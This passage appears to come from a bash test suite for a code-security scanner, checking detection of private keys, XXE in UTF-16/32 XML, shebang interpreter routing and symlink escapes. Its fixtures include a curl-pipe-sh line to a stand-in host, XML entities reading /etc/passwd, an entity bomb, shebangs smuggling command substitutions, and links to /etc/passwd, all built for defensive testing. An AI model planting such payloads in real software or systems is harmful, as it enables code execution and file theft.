    assert_contains "$(k_msgs "$KREP" __global__)" "trivy:output_could_not_be_read" "F3: …a WARN says so"
    assert_not_contains "$KOUT" "trivy: no known CVEs" "F3: …and the console does not claim there are no known CVEs"
    for _case in 'schema_only|{"SchemaVersion":2}' 'results_null|{"SchemaVersion":2,"Results":null}' 'results_empty|{"Results":[]}' \
                 'no_vulns_key|{"Results":[{"Target":"requirements.txt"}]}' 'vulns_null|{"Results":[{"Target":"t","Vulnerabilities":null}]}'; do
        k3_run "k3_${_case%%|*}" "${_case#*|}"
        assert_eq "ran" "$(k_cov L3_dependency_cve)" "F3: ${_case#*|} is a trivy document with nothing to report: ran"
    done
    assert_contains "$KOUT" "trivy: no known CVEs" "F3: …and says so"
    k3_run k3_two_vulns '{"SchemaVersion":2,"Results":[{"Vulnerabilities":[{"VulnerabilityID":"CVE-1"},{"VulnerabilityID":"CVE-2"}]},{"Target":"x"}]}'
    assert_contains "$(k_msgs "$KREP" "$K_CLEAN")" "trivy:2_vulnerable_dependencies" "F3: a document with vulnerabilities still fails the scan"

    # ── F4: the private-key rule reads a file with a NUL byte ────────────────────────────────────────
    # `grep -E -A5 header file | tr | grep -E body`: a NUL byte made the first grep treat the file as binary and print nothing to
    # the pipe, so a complete key passed. The key is built at run time so that this file holds no contiguous one.
    K4="${SCRATCH}/k4_pem"; rm -rf "$K4"; mkdir -p "$K4"
    k4_key() {   # k4_key <file> [body line]: header, two body lines, footer
        local h="-----BEGIN RSA ""PRIVATE KEY-----" f="-----END RSA ""PRIVATE KEY-----" b="${2:-$(printf 'MIIEowIBAAKCAQEA%.0s' 1 2 3 4)}"
        printf '%s\n%s\n%s\n%s\n' "$h" "$b" "$b" "$f" > "$1"
    }
    k4_key "$K4/plain.txt"
    k4_key "$K4/nul_end.txt";    printf '\0' >> "$K4/nul_end.txt"
    { printf '\0'; cat "$K4/plain.txt"; } > "$K4/nul_start.txt"
    { head -n 2 "$K4/plain.txt"; printf '\0\n'; tail -n 2 "$K4/plain.txt"; } > "$K4/nul_middle.txt"
    k4_key "$K4/nul_placeholder.txt" "XXXXXXXXXXXXXXXX"; printf '\0' >> "$K4/nul_placeholder.txt"
    k4_key "$K4/placeholder.txt" "XXXXXXXXXXXXXXXX"
    printf 'store the PRIVATE KEY in an HSM\n\0\n' > "$K4/prose_nul.txt"
    k_scan "$K4" k4_pem
    for _n in plain nul_end nul_start nul_middle; do
        assert_contains "$(k_msgs "$KREP" "${K4}/${_n}.txt")" "CWE-321:hardcoded_private_key" "F4: a complete private key is found (${_n})"
    done
    assert_not_contains "$(k_msgs "$KREP" "${K4}/nul_placeholder.txt")" "CWE-321" "F4: a header with a placeholder body is not a key, with a NUL byte either"
    assert_not_contains "$(k_msgs "$KREP" "${K4}/placeholder.txt")" "CWE-321" "F4: …nor without"
    assert_not_contains "$(k_msgs "$KREP" "${K4}/prose_nul.txt")" "CWE-321" "F4: prose about a private key, with a NUL byte, is not a key"

    # ── F5: scan_xml reads the document the way a parser does ───────────────────────────────────────
    # The comment-free view is decoded from UTF-16/UTF-32 (a byte-order mark, or the NUL pattern of a wide encoding without one):
    # every rule is ASCII and the NUL between the characters of a wide document hid an external entity from all of them, while
    # expat, libxml2 and Java parse the document. Comments are removed with str.find (the lazy regex was quadratic on openers
    # that never close), and an opener with no closer leaves the rest of the file visible.
    K5="${SCRATCH}/k5_xml"; rm -rf "$K5"; mkdir -p "$K5"
    python3 -I - "$K5" <<'PY'
import sys
d = sys.argv[1]
ent = '<?xml version="1.0"?>\n<!DOCTYPE a [\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<a>&x;</a>\n'
com = '<?xml version="1.0"?>\n<!-- <!ENTITY x SYSTEM "file:///etc/passwd"> -->\n<a>1</a>\n'
bomb = ('<?xml version="1.0"?>\n<!DOCTYPE a [\n<!ENTITY b "&a;&a;&a;&a;&a;">\n]>\n<a>&b;</a>\n')
cred = '<settings>\n<password>hunter2hunter2</password>\n</settings>\n'
clean = '<?xml version="1.0"?>\n<a>1</a>\n'
def w(name, data):
    open(d + "/" + name, "wb").write(data)
w("u16_bom.xml", ent.encode("utf-16"))
w("u16be_bom.xml", b"\xfe\xff" + ent.encode("utf-16-be"))
w("u16le_nobom.xml", ent.encode("utf-16-le"))
w("u16be_nobom.xml", ent.encode("utf-16-be"))
w("u32_bom.xml", ent.encode("utf-32"))
w("u32le_nobom.xml", ent.encode("utf-32-le"))
w("u32be_nobom.xml", ent.encode("utf-32-be"))
w("u8_bom.xml", b"\xef\xbb\xbf" + ent.encode())
w("u16_bomb.xml", bomb.encode("utf-16"))
w("u16_cred.xml", cred.encode("utf-16"))
w("u16_comment.xml", com.encode("utf-16"))
w("u16le_comment_nobom.xml", com.encode("utf-16-le"))
w("u16_clean.xml", clean.encode("utf-16"))
w("u8_commented.xml", com.encode())
w("u8_comment_then_entity.xml", ('<?xml version="1.0"?>\n<!-- c1 --><!-- c2 -->\n<!DOCTYPE a [\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<a>&x;</a>\n').encode())
w("u8_unterminated.xml", ('<?xml version="1.0"?>\n<!-- this comment is never closed\n<!DOCTYPE a [\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<a>&x;</a>\n').encode())
w("u8_closed_then_unterminated.xml", ('<?xml version="1.0"?>\n<!-- closed --><!-- never closed\n<!DOCTYPE a [\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<a>&x;</a>\n').encode())
w("u8_clean.xml", clean.encode())
PY
    k_scan "$K5" k5_xml
    for _n in u16_bom u16be_bom u16le_nobom u16be_nobom u32_bom u32le_nobom u32be_nobom; do
        assert_contains "$(k_msgs "$KREP" "${K5}/${_n}.xml")" "CWE-611:xxe_external_entity_references_a_resource" "F5: an external entity in ${_n}.xml (UTF-16/32) is found"
    done
    assert_contains "$(k_msgs "$KREP" "${K5}/u16_bomb.xml")" "CWE-776:xml_entity_expansion_bomb" "F5: …so is an entity expansion bomb in UTF-16"
    assert_contains "$(k_msgs "$KREP" "${K5}/u16_cred.xml")" "CWE-798:hardcoded_credential_in_XML" "F5: …and a credential element in UTF-16"
    assert_contains "$(k_msgs "$KREP" "${K5}/u8_bom.xml")" "CWE-611:xxe_external_entity_references_a_resource" "F5: UTF-8 with a byte-order mark is read as before"
    assert_not_contains "$(k_msgs "$KREP" "${K5}/u16_comment.xml")" "[FAIL]" "F5: an entity inside a comment of a UTF-16 document is not a declaration"
    assert_not_contains "$(k_msgs "$KREP" "${K5}/u16le_comment_nobom.xml")" "[FAIL]" "F5: …also without a byte-order mark"
    assert_not_contains "$(k_msgs "$KREP" "${K5}/u16_clean.xml")" "[FAIL]" "F5: a clean UTF-16 document is not failed"
    assert_not_contains "$(k_msgs "$KREP" "${K5}/u8_commented.xml")" "[FAIL]" "F5: an entity inside a comment of a UTF-8 document is still not a declaration"
    assert_not_contains "$(k_msgs "$KREP" "${K5}/u8_clean.xml")" "[FAIL]" "F5: a clean UTF-8 document is not failed"
    assert_contains "$(k_msgs "$KREP" "${K5}/u8_comment_then_entity.xml")" "CWE-611:xxe_external_entity_references_a_resource" "F5: a real entity after two closed comments is found"
    assert_contains "$(k_msgs "$KREP" "${K5}/u8_unterminated.xml")" "CWE-611:xxe_external_entity_references_a_resource" "F5: a comment that is never closed leaves the rest of the file visible"
    assert_contains "$(k_msgs "$KREP" "${K5}/u8_closed_then_unterminated.xml")" "CWE-611:xxe_external_entity_references_a_resource" \
        "F5: …after a closed comment as well"
    # 60,000 comment openers that never close (240 KB) took the lazy regex <!--.*?--> minutes: it rescans to the end of the input for each.
    K5Q="${SCRATCH}/k5_quad"; rm -rf "$K5Q"; mkdir -p "$K5Q"
    python3 -I -c "import sys; sys.stdout.write('<!--' * 60000 + '\n<a/>\n')" > "$K5Q/openers.xml"
    K5Q_T0=$(date +%s); KTIMEOUT=60; k_scan "$K5Q" k5_quad; KTIMEOUT=300; K5Q_SECS=$(( $(date +%s) - K5Q_T0 ))
    assert_eq "yes" "$([[ -f "$KREP" ]] && echo yes || echo no)" "F5: a 240 KB XML of unclosed comment openers is scanned to the end (a report is written)"
    assert_eq "1" "$(( K5Q_SECS < 25 ))" "F5: …and in linear time (took ${K5Q_SECS} s; the limit is 25 s)"
    # The temporary view is removed when the run is ended by a signal (it is registered with the EXIT trap).
    K5S=$(k_stubdir k5_term); k_wrap "$K5S" grep 'if [ "$1" = -ziE ]; then kill -TERM "$PPID"; sleep 1; exit 1; fi'
    K5T="${SCRATCH}/k5_tmp"; rm -rf "$K5T"; mkdir -p "$K5T"
    K5D="${SCRATCH}/k5_term_repo"; rm -rf "$K5D"; mkdir -p "$K5D"; printf '<a/>\n' > "$K5D/ok.xml"
    KENV=(PATH="${K5S}:${PATH}" TMPDIR="$K5T"); k_scan "$K5D" k5_term; KENV=()
    assert_eq "143" "$KEC" "F5: the stub ended the scan with SIGTERM while it searched the XML view (the test is not vacuous)"
    assert_eq "0" "$(ls -A "$K5T" | grep -c aitransit_xml_)" "F5: …and no temporary XML view is left behind"

    # ── F6: a grep that cannot finish is neither a match nor a clean file ────────────────────────────
    # grep_flat counted a grep that failed (exit 2: out of memory, an I/O error) as a MATCH, so the report named an XXE attack
    # (CWE-611, CWE-776) that was not there, with the real cause on the console only. It is now the hard FAIL
    # engine:search_incomplete on the file, once per file, and the file is not recorded as a PASS as well.
    K6="${SCRATCH}/k6_flat"; rm -rf "$K6"; mkdir -p "$K6/sub"
    printf '<?xml version="1.0"?>\n<a><b>1</b></a>\n' > "$K6/a.xml"
    printf '<?xml version="1.0"?>\n<Types><Type><Name>X</Name></Type></Types>\n' > "$K6/b.ps1xml"
    printf '<?xml version="1.0"?>\n<!DOCTYPE a [\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<a>&x;</a>\n' > "$K6/sub/c.xml"
    K6S=$(k_stubdir k6_grep); k_wrap "$K6S" grep 'if [ "$1" = -ziE ]; then echo "grep: memory exhausted" >&2; exit 2; fi'
    k_scan "$K6" k6_control
    K6_PASS_CONTROL=$(k_py "$KREP" "d['summary']['pass']")
    assert_not_contains "$(k_msgs "$KREP" "${K6}/a.xml")" "engine:" "F6: control, a working grep: a clean XML has no engine finding"
    assert_contains "$(k_msgs "$KREP" "${K6}/sub/c.xml")" "CWE-611:xxe_external_entity_references_a_resource" "F6: …and a real external entity is an XXE finding"
    KENV=(PATH="${K6S}:${PATH}"); k_scan "$K6" k6_fail; KENV=()
    assert_eq "FAIL" "$(k_verdict)" "F6: grep exiting 2 on the folded search: the scan fails"
    for _n in a.xml b.ps1xml sub/c.xml; do
        assert_contains "$(k_msgs "$KREP" "${K6}/${_n}")" "[FAIL] engine:search_incomplete" "F6: …${_n} has the FAIL engine:search_incomplete"
        assert_not_contains "$(k_msgs "$KREP" "${K6}/${_n}")" "CWE-" "F6: …and no invented XXE or entity-bomb finding"
        assert_eq "1" "$(k_msgs "$KREP" "${K6}/${_n}" | grep -o 'engine:search_incomplete' | wc -l | tr -d ' ')" "F6: …recorded once, although the file is searched several times"
    done
    assert_eq "3 engine" "$(k_py "$KREP" "str(sum(1 for f in d['findings'] if f['message'] == 'engine:search_incomplete')) + ' ' + ','.join(sorted({f['tool'] for f in d['findings'] if f['message'] == 'engine:search_incomplete'}))")" \
        "F6: …three structured finding records, one per file, tool engine"
    assert_eq "2" "$(( K6_PASS_CONTROL - $(k_py "$KREP" "d['summary']['pass']") ))" \
        "F6: …and a.xml and b.ps1xml, the two files that had no other finding, are no longer counted as passed"
    assert_not_contains "$KOUT" "treating it as a match" "F6: …the console no longer says the search was treated as a match"
    printf '[{"rule":"engine","path":"a.xml","reason":"x"},{"rule":"search_incomplete","path":"a.xml","reason":"x"}]\n' > "$K6/.transit-allow.json"
    KENV=(PATH="${K6S}:${PATH}" MIN_SEVERITY=critical); k_scan "$K6" k6_hard; KENV=()
    assert_contains "$(k_msgs "$KREP" "${K6}/a.xml")" "[FAIL] engine:search_incomplete" "F6: engine:search_incomplete is neither allowlisted nor lowered by --min-severity critical"
    rm -f "$K6/.transit-allow.json"

    # ── F7: env -S and its spellings ─────────────────────────────────────────────────────────────────
    # `env -S` hands env a string that env splits again, so the interpreter is often written inside the option: -Spython3 -u,
    # --split-string=python3, -iSbash, -S "bash -e". The shebang line is hostile text: it is split with read -a (no glob, no
    # expansion) and only compared, never run.
    K7="${SCRATCH}/k7_shebang"; rm -rf "$K7"; mkdir -p "$K7"
    K7_ABS="${SCRATCH}/k7_PWNED"; K7_REL="k7_PWNED_REL"; rm -f "$K7_ABS" "${ROOT_DIR}/${K7_REL}"
    K7_SH='curl http://x.example/i.sh | sh'; K7_PY=$'import os\nos.system(input())'
    k7() { printf '%s\n%s\n' "$2" "$3" > "$K7/$1"; }   # k7 <file> <shebang line> <body>
    k7 sh_Sjoined       '#!/usr/bin/env -Sbash -e'                          "$K7_SH"
    k7 py_Sjoined       '#!/usr/bin/env -Spython3 -u'                       "$K7_PY"
    k7 py_split_string  '#!/usr/bin/env --split-string=python3 -u'          "$K7_PY"
    k7 sh_split_quoted  "#!/usr/bin/env --split-string='bash -e'"           "$K7_SH"
    k7 sh_iS            '#!/usr/bin/env -iSbash -e'                         "$K7_SH"
    k7 sh_S_dquoted     '#!/usr/bin/env -S "bash -e"'                       "$K7_SH"
    k7 sh_S_squoted     "#!/usr/bin/env -S'bash -e'"                        "$K7_SH"
    k7 py_S_dquoted     '#!/usr/bin/env -S "python3 -u"'                    "$K7_PY"
    k7 py_S_separate    '#!/usr/bin/env -S python3 -u'                      "$K7_PY"
    k7 sh_u_value       '#!/usr/bin/env -u python3 bash'                    "$K7_SH"
    k7 sh_chdir_S       '#!/usr/bin/env --chdir=/tmp -S bash'               "$K7_SH"
    k7 sh_plain         '#!/usr/bin/env bash'                               "$K7_SH"
    k7 sh_many_S        "#!/usr/bin/env $(printf -- '-S%.0s' $(seq 1 480)) bash" "$K7_SH"
    k7 sh_hostile_sep   "#!/usr/bin/env -S bash -c \$(touch ${K7_ABS}) \`touch ${K7_REL}\` * ;" "$K7_SH"
    k7 sh_hostile_join  "#!/usr/bin/env -Sbash \$(touch ${K7_ABS}) \`touch ${K7_REL}\` *"       "$K7_SH"
    k7 hostile_option   "#!/usr/bin/env -S\$(touch ${K7_ABS})bash"          'echo fine'
    k7 hostile_split    "#!/usr/bin/env --split-string=\$(touch ${K7_ABS}) \`touch ${K7_REL}\`" 'echo fine'
    k7 env_S_nothing    '#!/usr/bin/env -S'                                 'echo hi'
    k7 env_Sbash_benign '#!/usr/bin/env -Sbash -e'                          'echo fine'
    k_scan "$K7" k7_shebang
    k7m() { k_msgs "$KREP" "${K7}/$1"; }
    SHRULE="CWE-78:remote_code_execution_curl_pipe_bash"; PYRULE="CWE-78:OS_command_injection_risk"
    assert_contains "$(k7m sh_Sjoined)"      "$SHRULE" "F7: #!/usr/bin/env -Sbash -e goes to the shell scanner"
    assert_contains "$(k7m py_Sjoined)"      "$PYRULE" "F7: #!/usr/bin/env -Spython3 -u goes to the Python scanner"
    assert_contains "$(k7m py_split_string)" "$PYRULE" "F7: --split-string=python3 -u likewise"
    assert_contains "$(k7m sh_split_quoted)" "$SHRULE" "F7: --split-string='bash -e' (a quoted string) likewise"
    assert_contains "$(k7m sh_iS)"           "$SHRULE" "F7: -iSbash (a cluster of short options ending in S) likewise"
    assert_contains "$(k7m sh_S_dquoted)"    "$SHRULE" "F7: -S \"bash -e\" (the string in double quotes) likewise"
    assert_contains "$(k7m sh_S_squoted)"    "$SHRULE" "F7: -S'bash -e' (joined, single quotes) likewise"
    assert_contains "$(k7m py_S_dquoted)"    "$PYRULE" "F7: -S \"python3 -u\" is still routed to Python (unchanged)"
    assert_contains "$(k7m py_S_separate)"   "$PYRULE" "F7: -S python3 -u (separate words) is unchanged"
    assert_contains "$(k7m sh_u_value)"      "$SHRULE" "F7: -u python3 bash: python3 is the value of -u, the interpreter is bash (unchanged)"
    assert_contains "$(k7m sh_chdir_S)"      "$SHRULE" "F7: --chdir=/tmp -S bash is unchanged"
    assert_contains "$(k7m sh_plain)"        "$SHRULE" "F7: #!/usr/bin/env bash is unchanged"
    assert_contains "$(k7m sh_many_S)"       "$SHRULE" "F7: 480 -S options in a row end, and the interpreter after them is found"
    assert_contains "$(k7m sh_hostile_sep)"  "$SHRULE" "F7: a hostile argument list after the interpreter does not stop the file being scanned…"
    assert_contains "$(k7m sh_hostile_join)" "$SHRULE" "F7: …nor a hostile list after -Sbash"
    assert_eq "absent" "$([[ -e "$K7_ABS" ]] && echo present || echo absent)" "F7: …no command substitution in a shebang line was executed"
    assert_eq "absent" "$([[ -e "${ROOT_DIR}/${K7_REL}" ]] && echo present || echo absent)" "F7: …nor a backtick one"
    assert_not_contains "$(k7m hostile_option)" "[FAIL]" "F7: an interpreter made of a command substitution routes nowhere and breaks nothing"
    assert_not_contains "$(k7m hostile_split)"  "[FAIL]" "F7: …likewise as the value of --split-string"
    assert_not_contains "$(k7m env_S_nothing)"  "[FAIL]" "F7: env -S with nothing after it breaks nothing"
    assert_not_contains "$(k7m env_Sbash_benign)" "[FAIL]" "F7: a harmless script with -Sbash is not failed by being routed"
    rm -f "$K7_ABS" "${ROOT_DIR}/${K7_REL}"

    # ── F8 to F11: both engines ──────────────────────────────────────────────────────────────────────
    # The Python engine copies the shell (docs/python_port_thin_plan.md), so every scenario of F8 to F11 is scanned under
    # TRANSIT_ENGINE=bash and under TRANSIT_ENGINE=python, and every assertion is made for both; the engine is named in each.
    k_status() { k_py "$KREP" "d['file_results'].get(a, {}).get('status', 'ABSENT')" "$1"; }   # k_status <file_results key>
    k_global() { k_msgs "$KREP" __global__; }
    k_tail()   { printf '%s\n' "$KOUT" | tail -n 1 | sed 's/\x1b\[[0-9;]*m//g'; }
    k_layers() { k_py "$KREP" "' '.join(k + '=' + d['coverage'].get(k, 'ABSENT') for k in ('L4_patterns', 'L5_per_language_sast'))"; }

    # ── F8: the pipeline's own control files do not count as 'something was examined' ──────────────────
    # .transitignore, .transit-allow.json and the fetcher's .manifest_sha256.txt, at the root, are scanned like any file but
    # are not "a file that was examined": `[!.]*` removed every file except .transitignore, which then counted, and the run
    # passed with layers 4 and 5 reading "ran". In a diff run only the changed files count (the listing used to count every file
    # before the diff filter). A repository that has nothing but control files has nothing the pattern removed.
    K8="${SCRATCH}/k8"; rm -rf "$K8"; mkdir -p "$K8"
    K8_NS="L4_patterns=skipped:nothing scanned (every file excluded) L5_per_language_sast=skipped:nothing scanned (every file excluded)"
    K8_MANIFEST='e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  ./x'
    k_hostile "$K8/ti_only" cfg.py;  printf '[!.]*\n' > "$K8/ti_only/.transitignore"
    k_hostile "$K8/three" cfg.py;    printf '[!.]*\n' > "$K8/three/.transitignore"
    printf '[]\n' > "$K8/three/.transit-allow.json"; printf '%s\n' "$K8_MANIFEST" > "$K8/three/.manifest_sha256.txt"
    mkdir -p "$K8/ctl_clean" "$K8/ctl_dirty" "$K8/nested/sub"
    printf 'zzz\n' > "$K8/ctl_clean/.transitignore";  printf '%s\n' "$K8_MANIFEST" > "$K8/ctl_clean/.manifest_sha256.txt"
    printf 'zzz\n# password = "hunter2hunter2"\n' > "$K8/ctl_dirty/.transitignore"
    k_hostile "$K8/nested" cfg.py;   printf 'cfg.py\n' > "$K8/nested/.transitignore"; printf '%s\n' "$K8_MANIFEST" > "$K8/nested/sub/.manifest_sha256.txt"
    k_hostile "$K8/diff_all" a.py;   k_hostile "$K8/diff_all" b.py;   printf 'a.py\n' > "$K8/diff_all/.transitignore"
    k_hostile "$K8/diff_other" a.py; k_hostile "$K8/diff_other" b.py; printf 'b.py\n' > "$K8/diff_other/.transitignore"
    k_hostile "$K8/diff_ctl" b.py;   printf 'zzz\n' > "$K8/diff_ctl/.transitignore"
    K8DW="${SCRATCH}/k8_dwork"; rm -rf "$K8DW"; mkdir -p "$K8DW"
    k8_diff() {   # k8_diff <name> <dir> <the one changed file>: a diff run (SINCE_COMMIT, a NUL-separated .diff_files); sets KOUT, KEC, KREP
        printf '%s\0' "$3" > "$K8DW/.diff_files"
        KENV=(TRANSIT_ENGINE="$K_ENG" SINCE_COMMIT=abc); KWD="$K8DW"; k_scan "$2" "$1_${K_ENG}"; KENV=(); KWD=""
    }
    for K_ENG in bash python; do
        KENV=(TRANSIT_ENGINE="$K_ENG"); k_scan "$K8/ti_only" "k8_ti_only_${K_ENG}"; KENV=()
        assert_eq "FAIL 1" "$(k_verdict) $KEC" "F8 [${K_ENG}]: a .transitignore of [!.]* that leaves only .transitignore itself is nothing scanned: FAIL, exit 1"
        assert_contains "$(k_global)" "[FAIL] engine:nothing_scanned" "F8 [${K_ENG}]: …with the FAIL engine:nothing_scanned on __global__"
        assert_eq "$K8_NS" "$(k_layers)" "F8 [${K_ENG}]: …and layers 4 and 5 do not read as ran"
        assert_eq "PASS" "$(k_status "${K8}/ti_only/.transitignore")" "F8 [${K_ENG}]: ….transitignore is still scanned like any file (it has its own entry)"
        assert_eq "ABSENT" "$(k_status "${K8}/ti_only/cfg.py")" "F8 [${K_ENG}]: …and the file the pattern removed is not scanned (control)"
        KENV=(TRANSIT_ENGINE="$K_ENG"); k_scan "$K8/three" "k8_three_${K_ENG}"; KENV=()
        assert_eq "FAIL 1" "$(k_verdict) $KEC" "F8 [${K_ENG}]: .transitignore, .transit-allow.json and .manifest_sha256.txt together are still nothing scanned"
        assert_contains "$(k_global)" "[FAIL] engine:nothing_scanned" "F8 [${K_ENG}]: …the FAIL is engine:nothing_scanned"
        assert_eq "PASS PASS PASS" "$(k_status "${K8}/three/.transitignore") $(k_status "${K8}/three/.transit-allow.json") $(k_status "${K8}/three/.manifest_sha256.txt")" \
            "F8 [${K_ENG}]: …each of the three is scanned and has its own entry"
        KENV=(TRANSIT_ENGINE="$K_ENG"); k_scan "$K8/ctl_clean" "k8_ctl_clean_${K_ENG}"; KENV=()
        assert_eq "PASS ran ran" "$(k_verdict) $(k_cov L4_patterns) $(k_cov L5_per_language_sast)" \
            "F8 [${K_ENG}]: a repository of only control files with a pattern is not nothing scanned (the pattern removed nothing)"
        assert_not_contains "$(k_global)" "engine:nothing_scanned" "F8 [${K_ENG}]: …no engine:nothing_scanned"
        KENV=(TRANSIT_ENGINE="$K_ENG"); k_scan "$K8/ctl_dirty" "k8_ctl_dirty_${K_ENG}"; KENV=()
        assert_contains "$(k_msgs "$KREP" "${K8}/ctl_dirty/.transitignore")" "CWE-798:hardcoded_credential" \
            "F8 [${K_ENG}]: …and a credential written into .transitignore is found: a control file is scanned"
        assert_not_contains "$(k_global)" "engine:nothing_scanned" "F8 [${K_ENG}]: …and that run is no nothing-scanned either"
        KENV=(TRANSIT_ENGINE="$K_ENG"); k_scan "$K8/nested" "k8_nested_${K_ENG}"; KENV=()
        assert_eq "PASS ran PASS" "$(k_verdict) $(k_cov L4_patterns) $(k_status "${K8}/nested/sub/.manifest_sha256.txt")" \
            "F8 [${K_ENG}]: a .manifest_sha256.txt in a sub-directory is something examined: only the one at the root is exempt"
        k8_diff k8_diff_all "$K8/diff_all" a.py
        assert_eq "FAIL 1" "$(k_verdict) $KEC" "F8 [${K_ENG}]: diff run, the only changed file removed by .transitignore (an unchanged file survives): nothing scanned"
        assert_contains "$(k_global)" "[FAIL] engine:nothing_scanned" "F8 [${K_ENG}]: …engine:nothing_scanned"
        assert_eq "$K8_NS" "$(k_layers)" "F8 [${K_ENG}]: …layers 4 and 5 skipped"
        assert_eq "ABSENT" "$(k_status "${K8}/diff_all/b.py")" "F8 [${K_ENG}]: …the unchanged file was not scanned (diff mode)"
        k8_diff k8_diff_other "$K8/diff_other" a.py
        assert_eq "FAIL" "$(k_status "${K8}/diff_other/a.py")" "F8 [${K_ENG}]: diff run, the changed file is not excluded: it is scanned and fails on its content"
        assert_not_contains "$(k_global)" "engine:nothing_scanned" "F8 [${K_ENG}]: …and it is not nothing scanned"
        k8_diff k8_diff_ctl "$K8/diff_ctl" .transitignore
        assert_eq "PASS ran ABSENT" "$(k_verdict) $(k_cov L4_patterns) $(k_status "${K8}/diff_ctl/b.py")" \
            "F8 [${K_ENG}]: diff run, the only changed file is .transitignore: nothing the pattern removed counts, the unchanged hostile file is not scanned"
    done

    # ── F9: symbolic links are reported, never followed, and never archived as their targets ─────────────
    # find -type f lists no link and nothing follows one, so a link used to leave no trace; zip without -y read the target in, so a
    # link to /etc/passwd, or to a directory outside the repository, put that file or that tree into the approved archive unscanned.
    # A link whose target text is absolute, or climbs above the root of the scan, is a FAIL; any other link is a WARN.
    K9="${SCRATCH}/k9_repo"; K9O="${SCRATCH}/k9_outside"; rm -rf "$K9" "$K9O"
    mkdir -p "$K9/sub" "$K9/node_modules/pkg" "$K9O/hostile_dir"
    printf 'print(1)\n' > "$K9/ok.py"; k_hostile "$K9/sub" hostile.py; k_hostile "$K9O" outside.py; k_hostile "$K9O/hostile_dir" h.py
    K9_NL=$'nl\nlink'
    k9_target() { local x; x=$(readlink -- "${K9}/$1"); printf '%s' "${x/#"$K9O"/<outside>}"; }   # the target text, without the scratch path
    K9_FAIL=(abs_link abs_dir up_link up_dir sub/deep_up down_then_up root_up "$K9_NL")
    K9_WARN=(rel_link dir_link dangling sub/ok_up inner dotted trailing sub/to_root sub/self)
    ln -s /etc/passwd "$K9/abs_link";                 ln -s "${K9O}/hostile_dir" "$K9/abs_dir"      # absolute targets
    ln -s ../k9_outside/outside.py "$K9/up_link";     ln -s ../k9_outside/hostile_dir "$K9/up_dir"  # relative, above the root
    ln -s ../../x "$K9/sub/deep_up";                  ln -s sub/../../x "$K9/down_then_up"          # one level too far, also after going down
    ln -s .. "$K9/root_up";                           ln -s /etc/passwd "$K9/$K9_NL"                # the parent of the root; a newline in the name
    ln -s ok.py "$K9/rel_link";                       ln -s sub "$K9/dir_link"                      # relative, inside
    ln -s nowhere.txt "$K9/dangling";                 ln -s ../ok.py "$K9/sub/ok_up"
    ln -s sub/../ok.py "$K9/inner";                   ln -s ./sub/./ok_up "$K9/dotted"
    ln -s sub/ "$K9/trailing";                        ln -s .. "$K9/sub/to_root"                    # sub/.. is the root itself
    ln -s . "$K9/sub/self"
    ln -s /etc/passwd "$K9/node_modules/pkg/lnk"                                                    # below a built-in exclusion
    K9W="${SCRATCH}/k9_warn"; rm -rf "$K9W"; mkdir -p "$K9W/sub"; printf 'print(1)\n' > "$K9W/ok.py"; printf 'print(2)\n' > "$K9W/sub/inner.py"
    ln -s ok.py "$K9W/rel_link"; ln -s sub "$K9W/dir_link"; ln -s nowhere.txt "$K9W/dangling"; ln -s ../ok.py "$K9W/sub/ok_up"
    K9Z="${SCRATCH}/k9_zip"; rm -rf "$K9Z"; mkdir -p "$K9Z/sub"
    printf 'KMARK_FILE_%s\n' "CONTENT" > "$K9Z/real.txt"; printf 'KMARK_DIR_%s\n' "CONTENT" > "$K9Z/sub/inner.txt"
    ln -s real.txt "$K9Z/file_link"; ln -s sub "$K9Z/dir_link"
    K9E="${SCRATCH}/k9_escape"; rm -rf "$K9E"; mkdir -p "$K9E"; printf 'print(1)\n' > "$K9E/ok.py"; ln -s /etc/passwd "$K9E/passwd_link"
    for K_ENG in bash python; do
        KENV=(TRANSIT_ENGINE="$K_ENG"); k_scan "$K9" "k9_${K_ENG}"; KENV=()
        assert_eq "FAIL 1" "$(k_verdict) $KEC" "F9 [${K_ENG}]: a repository with links that leave the scanned directory fails"
        for _l in "${K9_FAIL[@]}"; do
            _lbl=${_l//$'\n'/<LF>}
            assert_eq "[FAIL] symlink:target_outside_the_scanned_directory" "$(k_msgs "$KREP" "${K9}/${_l}")" \
                "F9 [${K_ENG}]: the link '${_lbl}' (-> $(k9_target "${_l}")) is a FAIL, and only that"
        done
        for _l in "${K9_WARN[@]}"; do
            assert_eq "[WARN] symlink:not_followed_its_target_is_not_scanned_through_the_link" "$(k_msgs "$KREP" "${K9}/${_l}")" \
                "F9 [${K_ENG}]: the link '${_l}' (-> $(k9_target "${_l}")) stays inside: a WARN, and only that"
        done
        assert_eq "ABSENT" "$(k_status "${K9}/node_modules/pkg/lnk")" "F9 [${K_ENG}]: a link below a pruned directory (node_modules) stays silent"
        assert_eq "0" "$(k_py "$KREP" "sum(1 for k in d['file_results'] if any(s in k for s in ('/dir_link/', '/abs_dir/', '/up_dir/', '/trailing/')))")" \
            "F9 [${K_ENG}]: nothing is followed: no file is reported through a link to a directory"
        assert_eq "0" "$(k_py "$KREP" "sum(1 for k in d['file_results'] if k.startswith(a))" "$K9O")" \
            "F9 [${K_ENG}]: …and nothing outside the scanned directory is scanned"
        assert_eq "FAIL" "$(k_status "${K9}/sub/hostile.py")" "F9 [${K_ENG}]: …while the real file below sub is scanned as before"
        assert_eq "${#K9_FAIL[@]}" "$(k_py "$KREP" "sum(1 for f in d['findings'] if f['rule_id'] == 'target_outside_the_scanned_directory')")" \
            "F9 [${K_ENG}]: each escaping link is one structured finding record"
        KENV=(TRANSIT_ENGINE="$K_ENG"); k_scan "$K9W" "k9w_${K_ENG}"; KENV=()
        assert_eq "PASS 0" "$(k_verdict) $KEC" "F9 [${K_ENG}]: a repository whose links all stay inside passes (the links are WARN only)"
        assert_eq "4" "$(k_py "$KREP" "sum(1 for k, v in d['file_results'].items() if 'symlink:not_followed' in v['message'])")" \
            "F9 [${K_ENG}]: …and all four are reported"
        KENV=(TRANSIT_ENGINE="$K_ENG"); k_scan "$K9E" "k9e_${K_ENG}"; KENV=()
        assert_eq "FAIL 1" "$(k_verdict) $KEC" "F9 [${K_ENG}]: a repository whose only fault is one link to /etc/passwd fails"
